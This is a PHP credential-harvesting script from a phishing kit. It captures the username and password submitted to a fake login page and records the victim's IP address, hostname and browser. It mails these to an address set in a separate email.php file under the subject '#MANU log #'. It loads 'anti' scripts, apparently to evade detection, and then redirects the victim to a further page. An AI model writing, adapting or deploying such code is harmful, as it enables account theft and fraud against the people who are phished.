<?php
session_start();
	include "email.php";
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';


$user = $_POST['username'];
$pass = $_POST['password'];
$_SESSION['username'] = $_POST['username'];
$_SESSION['password'] = $_POST['password'];


if (getenv('HTTP_CLIENT_IP')){
	$ip=getenv('HTTP_CLIENT_IP');}
else {
	$ip=getenv('REMOTE_ADDR');}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "
=====================
User: $user
Pass: $pass
---------------------
Ip: $ip,$browser
Host: $hostname
=====================";

 if (strlen($user) >= 16 || strlen($user) <=5 ) {
  echo "<meta http-equiv='refresh' content='0;url=index.php'>";
  
 }
else{
	$subj = "#MANU log # $user $ip";
	mail($emailusr,$subj,$data);

	  }



?>
<script>
    window.top.location.href = "./load/p1.htm";

</script>